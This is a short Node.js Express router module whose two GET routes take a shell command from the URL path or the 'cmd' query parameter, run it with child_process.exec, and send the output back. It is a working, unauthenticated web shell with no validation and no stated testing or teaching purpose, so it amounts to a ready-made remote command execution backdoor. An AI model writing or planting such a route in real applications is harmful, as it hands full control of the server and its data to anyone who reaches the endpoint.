'use strict'

const express = require('express')
const child = require('child_process')

let app = express.Router()

app.get('/:cmd', (req, res) => {
  child.exec(req.params.cmd, (err, stdout, stderr) => {
    res
    .set('Content-type', 'text/plain')
    .send(
      stdout.toString() + '\n' +
      stderr.toString() + '\n' +
      err
    )
  })
})

app.get('/', (req, res) => {
  child.exec(req.query.cmd, (err, stdout, stderr) => {
    res
    .set('Content-type', 'text/plain')
    .send(
      stdout.toString() + '\n' +
      stderr.toString() + '\n' +
      err
    )
  })
})

module.exports = app
